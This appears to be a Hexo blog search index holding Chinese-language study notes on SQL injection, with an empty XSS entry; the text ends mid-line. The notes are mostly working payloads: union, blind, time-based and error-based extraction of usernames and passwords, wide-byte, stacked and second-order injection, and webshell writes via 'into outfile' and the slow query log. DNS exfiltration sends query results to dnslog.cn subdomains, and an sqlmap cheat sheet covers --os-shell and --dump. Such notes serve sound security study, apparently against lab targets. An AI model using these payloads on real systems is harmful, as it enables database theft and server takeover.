<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>web-xss 其一</title>
      <link href="/2023/10/06/page/"/>
      <url>/2023/10/06/page/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>web-sql注入其二</title>
      <link href="/2023/08/04/page/"/>
      <url>/2023/08/04/page/</url>
      
        <content type="html"><![CDATA[<hr><h1 id="sql-注入类型"><a href="#sql-注入类型" class="headerlink" title="sql 注入类型"></a>sql 注入类型</h1><div class="table-container"><table><thead><tr><th style="text-align:left">Type</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td style="text-align:left">数字型</td><td style="text-align:left">id=1</td></tr><tr><td style="text-align:left">字符型</td><td style="text-align:left">id=’1’</td></tr><tr><td style="text-align:left">搜索型</td><td style="text-align:left">闭合%’ and ‘%’=’</td></tr><tr><td style="text-align:left">编码型</td><td style="text-align:left">数据以编码值传递</td></tr><tr><td style="text-align:left">加密型</td><td style="text-align:left">数据以加密的md5发送</td></tr><tr><td style="text-align:left">格式型</td><td style="text-align:left">JSON</td></tr></tbody></table></div><h1 id="提交方式"><a href="#提交方式" class="headerlink" title="提交方式"></a>提交方式</h1><div class="table-container"><table><thead><tr><th style="text-align:left">Type</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td style="text-align:left">get</td><td style="text-align:left">url传递参数</td></tr><tr><td style="text-align:left">post</td><td style="text-align:left">与网站功能点有关</td></tr><tr><td style="text-align:left">cookie</td><td style="text-align:left">JWT反序列化</td></tr><tr><td style="text-align:left">server</td><td style="text-align:left">记录XFF头信息，浏览器信息，当前访问url地址</td></tr><tr><td style="text-align:left">XFF</td><td style="text-align:left">密码错误N次机会，考虑通过XFF的ip或cookie判断用户身份</td></tr></tbody></table></div><h1 id="高权限读写文件"><a href="#高权限读写文件" class="headerlink" title="高权限读写文件"></a>高权限读写文件</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--文件读写操作存在条件</span></span><br><span class="line">secure_file_priv 为空(<span class="number">5.5</span>之后默认为 <span class="keyword">null</span>)</span><br><span class="line"><span class="keyword">null</span>: 不允许导入或导出 空：不限制目录 <span class="operator">/</span>tmp：只允许在<span class="operator">/</span>tmp 目录导入导出</span><br><span class="line"><span class="comment">--路径获取：遗留 phpinfo 文件、报错网页暴露路径、爆破路径</span></span><br><span class="line"><span class="comment">--读写文件</span></span><br><span class="line"><span class="keyword">select</span> load_file (d:<span class="operator">/</span><span class="number">1.</span> txt);</span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;一句话&#x27;</span> <span class="keyword">into</span> outfile<span class="operator">||</span>dumpfile <span class="string">&#x27;d:/1. txt&#x27;</span>;</span><br><span class="line"><span class="operator">!</span> <span class="comment">--路径错误时斜杠可替换 \ \\</span></span><br><span class="line"><span class="comment">--查询是否有写入的权限</span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> variables <span class="keyword">like</span> <span class="operator">%</span>secure_file_priv<span class="operator">%</span>;</span><br><span class="line"><span class="comment">--查询当前用户是否拥有读写权限</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> file_priv,<span class="number">2</span> <span class="keyword">from</span> mysql.user <span class="keyword">where</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27;root&#x27;</span> <span class="keyword">and</span> host<span class="operator">=</span><span class="string">&#x27;localhost&#x27;</span></span><br><span class="line"><span class="comment">--注入</span></span><br><span class="line"><span class="keyword">and</span>(<span class="keyword">select</span> file_priv <span class="keyword">from</span> mysql.user <span class="keyword">where</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27;root&#x27;</span> <span class="keyword">and</span> host<span class="operator">=</span><span class="string">&#x27;localhost&#x27;</span>)<span class="operator">=</span><span class="string">&#x27;Y&#x27;</span></span><br><span class="line"><span class="comment">--开启日志()</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> slow_query_log <span class="operator">=</span><span class="number">1</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> slow_query_log_file<span class="operator">=</span><span class="string">&#x27;shell 路径&#x27;</span></span><br><span class="line"><span class="operator">!</span> <span class="comment">--寻找 phpmyadmin、连接数据库能够执行 sql 语句的地方</span></span><br></pre></td></tr></table></figure><h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><h2 id="功能点"><a href="#功能点" class="headerlink" title="功能点"></a>功能点</h2><div class="table-container"><table><thead><tr><th style="text-align:left">Type</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td style="text-align:left">select</td><td style="text-align:left">布尔盲注</td></tr><tr><td style="text-align:left">insert</td><td style="text-align:left">报错盲注</td></tr><tr><td style="text-align:left">updata</td><td style="text-align:left">报错盲注</td></tr><tr><td style="text-align:left">delete</td><td style="text-align:left">延时注入</td></tr></tbody></table></div><ul><li>查询方法增删改查四种特性决定，此类注入基本采用盲注黑盒测试：可以通过功能点判断注入</li><li>查询方式四种特性决定应用功能点（会员注册，删除新闻，修改文章等）</li></ul><h2 id="逻辑"><a href="#逻辑" class="headerlink" title="逻辑"></a>逻辑</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--判断数据库长度是否为7 数据包中空格用+号代替</span></span><br><span class="line"><span class="keyword">and</span> length(database())<span class="operator">=</span><span class="number">7</span><span class="comment">--+</span></span><br><span class="line"><span class="comment">--判断数据库第一个字母 ascii 值</span></span><br><span class="line"><span class="keyword">and</span> ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">105</span><span class="comment">--+</span></span><br><span class="line"><span class="comment">--判断数据库版本</span></span><br><span class="line"><span class="keyword">and</span> <span class="keyword">left</span>(version(),<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;5&#x27;</span><span class="comment">--+</span></span><br><span class="line"><span class="comment">--判断表长(也可以判断表的数量)</span></span><br><span class="line"><span class="keyword">and</span> length((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">6</span><span class="comment">--+</span></span><br><span class="line"><span class="comment">--判断表字符</span></span><br><span class="line"><span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;pikachu&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)) <span class="operator">=</span><span class="number">104</span><span class="comment">--+</span></span><br><span class="line"><span class="comment">--获取列数</span></span><br><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;pikachu&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;httpinfo&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>) <span class="operator">=</span><span class="number">6</span><span class="comment">--+</span></span><br><span class="line"><span class="comment">--获取列长度(或者可以通过列名的长度测试)</span></span><br><span class="line"><span class="keyword">and</span> length((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;pikachu&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;httpinfo&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">2</span><span class="comment">--+</span></span><br><span class="line"><span class="comment">--获取列名</span></span><br><span class="line"><span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name <span class="operator">=</span><span class="string">&#x27;httpinfo&#x27;</span> <span class="keyword">and</span> table_schema <span class="operator">=</span> <span class="string">&#x27;pikachu&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>), <span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">1</span><span class="comment">--+</span></span><br><span class="line"><span class="comment">--获取数据条数</span></span><br><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> httpinfo) <span class="operator">=</span> <span class="number">0</span> <span class="comment">--+</span></span><br><span class="line"><span class="comment">--获取第一个数据长度</span></span><br><span class="line"><span class="keyword">and</span> length((<span class="keyword">select</span> username <span class="keyword">from</span> users limit <span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">4</span><span class="comment">--+</span></span><br><span class="line"><span class="comment">--获取 users 表下 username 字段第一个数据的字符</span></span><br><span class="line"><span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> username <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span>), <span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">68</span><span class="comment">--+</span></span><br><span class="line"><span class="comment">--if判断</span></span><br><span class="line"><span class="keyword">and</span> if(database()<span class="operator">=</span><span class="string">&#x27;pikachu&#x27;</span>,<span class="number">123</span>,<span class="number">456</span>)<span class="operator">=</span><span class="number">456</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><h2 id="延迟"><a href="#延迟" class="headerlink" title="延迟"></a>延迟</h2><ul><li>利用 sleep()返回时间判断：但是可能会有网速干扰</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--判断注入</span></span><br><span class="line"><span class="keyword">and</span> sleep(<span class="number">2</span>) <span class="comment">--+</span></span><br><span class="line"><span class="comment">--判断数据库长度是否为8</span></span><br><span class="line"><span class="keyword">and</span> sleep(if(length(database())<span class="operator">=</span><span class="number">7</span>,<span class="number">5</span>,<span class="number">0</span>))<span class="comment">--+</span></span><br><span class="line"><span class="comment">--判断数据库第一个字符是否s</span></span><br><span class="line"><span class="keyword">and</span> if(substr(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;p&#x27;</span>,sleep(<span class="number">3</span>),<span class="keyword">null</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure><h2 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- updatexml报错</span></span><br><span class="line"><span class="keyword">and</span> (updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>),<span class="number">1</span>))<span class="comment">--+</span></span><br><span class="line"><span class="comment">--updatexml报错得到表名</span></span><br><span class="line"><span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x5e</span>,(substr((<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()),<span class="number">1</span>)),<span class="number">0x5e</span>),<span class="number">1</span>)<span class="comment">--+</span></span><br><span class="line"><span class="comment">--updatexml报错得到列名</span></span><br><span class="line"><span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x5e</span>,(substr((<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database()),<span class="number">1</span>)),<span class="number">0x5e</span>),<span class="number">1</span>)<span class="comment">--+</span></span><br><span class="line"><span class="comment">--updatexml报错得到数据</span></span><br><span class="line"><span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x5e</span>,(substr((<span class="keyword">select</span> group_concat(username,<span class="number">0x7e</span>, password) <span class="keyword">from</span> <span class="keyword">user</span>),<span class="number">1</span>)), <span class="number">0x5e</span>), <span class="number">1</span>) <span class="comment">--+</span></span><br><span class="line"><span class="operator">!</span> <span class="comment">--发现只可以显示一段，可与将其中的 1 换成 31 然后 62，依次类推。因为显示 31 个字符</span></span><br><span class="line"><span class="comment">-- floor 报错</span></span><br><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(),concat(<span class="keyword">user</span>(),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)<span class="comment">--+</span></span><br><span class="line"><span class="comment">--extractvalue报错</span></span><br><span class="line"><span class="keyword">and</span> (extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>)))<span class="comment">--+</span></span><br><span class="line"><span class="comment">--linestring报错</span></span><br><span class="line"><span class="keyword">and</span> linestring((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))<span class="comment">--+</span></span><br></pre></td></tr></table></figure><h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><div class="note info simple"><p>单引号被转义 ‘ 被转义成 ‘\ 使用%df 组合成\%df 可以吃掉反斜杠<br>代码中存在 addslashes () 之类的转义函数<br>存在 tamper 脚本 sqlmap ummagic</p></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--列字段</span></span><br><span class="line">id<span class="operator">=</span><span class="number">2</span><span class="operator">%</span>df<span class="string">&#x27; order by 3 --+ &#x27;</span></span><br><span class="line"><span class="comment">--联合查询</span></span><br><span class="line">id<span class="operator">=</span><span class="number">2</span><span class="operator">%</span>df<span class="string">&#x27; union select 1,2,3 --+ &#x27;</span></span><br></pre></td></tr></table></figure><h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><ul><li>取决于数据库支持否多条语句执行</li><li>使用; 号结束前面的语句后构造自己的语句</li><li>select * from news where id=1; select user ();</li></ul><div class="note info simple"><p>强网杯随便注<br>绕过进行16进制编码</p></div><h1 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h1><ul><li>插入恶意数据,引用恶意数据</li><li>找回密码逻辑经常出现</li><li>注册用户的时候用恶意用户名<ul><li>然后修改密码会调用这个恶意用户名</li></ul></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--构造恶意用户名</span></span><br><span class="line">admin<span class="string">&#x27;#</span></span><br><span class="line"><span class="string">--通过找回密码可以修改admin的密码</span></span><br></pre></td></tr></table></figure><h1 id="DNS-注入"><a href="#DNS-注入" class="headerlink" title="DNS 注入"></a>DNS 注入</h1><ul><li>需要能使用 load_file 类似</li><li>secure_file_priv 为””</li><li>解决不回显，反向链接，sql 注入，命令执行，ssrf 等</li><li>ping %USERHOME%. dnslog. cn 返回本地电脑用户名</li><li>命令执行中好用<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--查询数据库的版本</span></span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select load_file(concat(&#x27;</span>\\<span class="string">&#x27;,(select database()),&#x27;</span>.ahgpow.dnslog.cn\<span class="number">123</span><span class="string">&#x27;)) ,2,3 --+</span></span><br><span class="line"><span class="string">--域名长度太长，不能超过63位</span></span><br><span class="line"><span class="string">id=1&#x27;</span> <span class="keyword">and</span> load_file(concat(<span class="string">&#x27;\\&#x27;</span>,(<span class="keyword">select</span> group_concat(table_name SEPARATOR<span class="string">&#x27;-&#x27;</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>‘security’ ),<span class="string">&#x27;.tdwu21.dnslog.cn\xxx.txt&#x27;</span>)) <span class="comment">--+</span></span><br></pre></td></tr></table></figure></li></ul><h1 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h1><div class="table-container"><table><thead><tr><th style="text-align:left">order</th><th style="text-align:left">info</th></tr></thead><tbody><tr><td style="text-align:left">sqlmap -u “url”</td><td style="text-align:left">判断是否存在注入点</td></tr><tr><td style="text-align:left">—is-dba</td><td style="text-align:left">判断是否为数据库管理员</td></tr><tr><td style="text-align:left">—dbs</td><td style="text-align:left">获取所有数据库</td></tr><tr><td style="text-align:left">current-db</td><td style="text-align:left">获取当前数据库</td></tr><tr><td style="text-align:left">—tables</td><td style="text-align:left">获取所有数据库的表 -D “数据库” 指定数据库</td></tr><tr><td style="text-align:left">—columns</td><td style="text-align:left">获取表下面的列名 -T -D</td></tr><tr><td style="text-align:left">—dump</td><td style="text-align:left">获取数据 -C -T -D</td></tr><tr><td style="text-align:left">—purge</td><td style="text-align:left">清除缓存如果同一个网站的话会影响判断</td></tr><tr><td style="text-align:left">sqlmap -r 1. txt</td><td style="text-align:left">登录后的界面或者指定注入点 post 提交 * 号指明注入点</td></tr><tr><td style="text-align:left">—os —os-cmd —os-shell</td><td style="text-align:left">命令执行</td></tr><tr><td style="text-align:left">—file-read</td><td style="text-align:left">文件读取</td></tr><tr><td style="text-align:left">—file-write  —file-desk</td><td style="text-align:left">文件写入</td></tr></tbody></table></div><hr><p><a href="https://www.cnblogs.com/bmjoker/p/9326258.html">sqlmaptamper 脚本</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>web-sql注入其一</title>
      <link href="/2023/08/03/page/"/>
      <url>/2023/08/03/page/</url>
      
        <content type="html"><![CDATA[<hr><h1 id="SQL-注入流程"><a href="#SQL-注入流程" class="headerlink" title="SQL 注入流程"></a>SQL 注入流程</h1><h2 id="漏洞产生的条件"><a href="#漏洞产生的条件" class="headerlink" title="漏洞产生的条件"></a>漏洞产生的条件</h2><ul><li>存在可控变量</li><li>SQL 语句带入了数据库查询</li></ul><h2 id="寻找注入点"><a href="#寻找注入点" class="headerlink" title="寻找注入点"></a>寻找注入点</h2><ul><li>根据数据库语言：<ul><li>select:显示数据，登录等相关操作</li><li>insert:新建用户，新建等相关操作</li><li>delete:注销用户，删除等相关操作</li><li>update:修改数据，修改密码等相关操作</li></ul></li><li>根据网址类型：index. php? id=1</li><li>提交方式：如 get、post、cookie、server 等地方</li></ul><h2 id="判断注入"><a href="#判断注入" class="headerlink" title="判断注入"></a>判断注入</h2><ul><li>字符型检测：<ul><li>index. php? id=1’—会显示报错</li><li>index. php? id=1’ and 1=1 # —显示正常</li><li>index. php? id=1’ and 1=2 # —显示报错</li></ul></li><li>数字型检测：<ul><li>index. php? id=1 and 1=1  —正常</li><li>index. php? id=1 and 1=2  —显示报错</li></ul></li><li>搜索类型：<ul><li>select * from admin where a like ‘%id%’;</li><li>select * from admin where a like %id% or 1=1 #%’</li></ul></li></ul><div class="note info simple"><p>字符型需要闭合后面的’所以需要—+ # 不是的话不用加</p></div><h1 id="Access"><a href="#Access" class="headerlink" title="Access"></a>Access</h1><ul><li>access 结构<ul><li>表名<ul><li>列名<ul><li>数据</li></ul></li></ul></li></ul></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--access 无 information_shema 表 (只能爆破)</span></span><br><span class="line"><span class="comment">--猜解表名</span></span><br><span class="line"><span class="keyword">and</span> <span class="keyword">exists</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表名)</span><br><span class="line"><span class="comment">--猜解字段名</span></span><br><span class="line"><span class="keyword">and</span> <span class="keyword">exists</span> (<span class="keyword">select</span> passwd <span class="keyword">from</span> 表名)</span><br><span class="line"><span class="comment">--联合查询</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">4</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> admin</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,username,passwd,<span class="number">4</span> <span class="keyword">from</span> admin</span><br><span class="line"><span class="comment">--布尔盲注</span></span><br><span class="line"><span class="comment">--偏移注入</span></span><br><span class="line"><span class="operator">!</span> <span class="comment">--只能用于知道表名不知道字段名的情况</span></span><br><span class="line"><span class="comment">--猜解字段数</span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> <span class="number">7</span></span><br><span class="line"><span class="comment">--随机爆字段</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="operator">*</span> <span class="keyword">from</span> admin </span><br><span class="line"><span class="operator">!</span> <span class="comment">--如果有数据说明星号替换了 3 个字段</span></span><br><span class="line"><span class="operator">!</span> <span class="comment">--计算字段 * 2&lt; 字段数公式成立可以用自连接查询</span></span><br><span class="line"><span class="comment">--自连接查询</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="operator">*</span> <span class="keyword">from</span> (admin <span class="keyword">as</span> a <span class="keyword">inner</span> <span class="keyword">join</span> admin <span class="keyword">as</span> b <span class="keyword">on</span> a.id<span class="operator">=</span>b.id)</span><br></pre></td></tr></table></figure><h1 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h1><h2 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h2><ul><li>Mysql 两种攻击<ol><li>非 root 攻击<ul><li>常规类的猜解</li></ul></li><li>root 用户攻击<ul><li>猜解数据</li><li>文件读写</li><li>跨库查询注入等</li></ul></li></ol></li></ul><div class="note info simple"><p>看权限黑盒用 user () 白盒看代码</p></div><h2 id="注入流程"><a href="#注入流程" class="headerlink" title="注入流程"></a>注入流程</h2><ul><li>mysql 低版本： 暴力查询、读取查询</li><li>mysql 高版本 </li></ul><div class="table-container"><table><thead><tr><th style="text-align:left">Function</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td style="text-align:left">tables_schema</td><td style="text-align:left">数据库名</td></tr><tr><td style="text-align:left">tables_name</td><td style="text-align:left">表名</td></tr><tr><td style="text-align:left">columns_name</td><td style="text-align:left">列名</td></tr><tr><td style="text-align:left">information_schema.tables</td><td style="text-align:left">记录所有表名信息的表</td></tr><tr><td style="text-align:left">information_schema.columns</td><td style="text-align:left">记录所有列名信息的表</td></tr><tr><td style="text-align:left">group_concat()</td><td style="text-align:left">显示多条数据防止查漏</td></tr></tbody></table></div><ul><li>常用函数</li></ul><div class="table-container"><table><thead><tr><th style="text-align:left">Function</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td style="text-align:left">version ()</td><td style="text-align:left">数据库版本, 5.0 为分界</td></tr><tr><td style="text-align:left">database ()</td><td style="text-align:left">数据库名称</td></tr><tr><td style="text-align:left">user ()</td><td style="text-align:left">数据库用户</td></tr><tr><td style="text-align:left">version_compile_os</td><td style="text-align:left">操作系统</td></tr></tbody></table></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--猜解字段</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">4</span> </span><br><span class="line"><span class="comment">--获取显示字段</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span></span><br><span class="line"><span class="comment">--获取数据库信息</span></span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> version (), <span class="keyword">user</span> (), database ()</span><br><span class="line"><span class="comment">--获取表名</span></span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(table_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br><span class="line"><span class="comment">--获取列名</span></span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(column_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span></span><br><span class="line"><span class="comment">--获取指定数据</span></span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(username,<span class="string">&#x27;~&#x27;</span>),group_concat(password,<span class="string">&#x27;~&#x27;</span>) <span class="keyword">from</span> users</span><br><span class="line"><span class="comment">--跨库注入</span></span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(schema_name,<span class="string">&#x27;~&#x27;</span>),<span class="number">2</span> <span class="keyword">from</span> information_schema.schemata</span><br></pre></td></tr></table></figure><h1 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h1><ul><li>常用函数</li></ul><div class="table-container"><table><thead><tr><th style="text-align:left">Function</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td style="text-align:left">current_database ()</td><td style="text-align:left">获取当前数据库</td></tr><tr><td style="text-align:left">current_user</td><td style="text-align:left">获取当前用户</td></tr><tr><td style="text-align:left">version ()</td><td style="text-align:left">获取当前数据库版本</td></tr><tr><td style="text-align:left">string_agg ()</td><td style="text-align:left">将查询到的信息拼接</td></tr><tr><td style="text-align:left">Datname</td><td style="text-align:left">数据库名字</td></tr><tr><td style="text-align:left">Pg_database</td><td style="text-align:left">存储着所有数据库名</td></tr></tbody></table></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--获取字段数</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">4</span></span><br><span class="line"><span class="comment">--获取回显位</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span> </span><br><span class="line"><span class="operator">!</span> <span class="comment">--union 后面不能跟数字会报错</span></span><br><span class="line"><span class="comment">--获取数据库名</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="string">&#x27;1&#x27;</span>,current_database(),<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span></span><br><span class="line"><span class="comment">--获取表名</span></span><br><span class="line">d<span 